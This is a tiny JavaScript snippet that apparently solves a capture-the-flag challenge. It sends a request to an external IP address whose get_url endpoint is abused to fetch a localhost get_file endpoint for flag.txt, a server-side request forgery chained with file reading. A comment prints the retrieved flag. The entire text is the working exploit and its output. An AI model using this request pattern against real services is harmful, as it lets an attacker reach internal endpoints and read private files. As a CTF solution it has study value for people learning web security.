const url = "http://45.134.3.200:3000/get_url?url=http://localhost:3000/get_file?file=flag.txt";
fetch(url).then((x) => x.text()).then((x) => console.log(x));
// Output : flag{h0p3_y0u_l1ked_my_@pp5613}
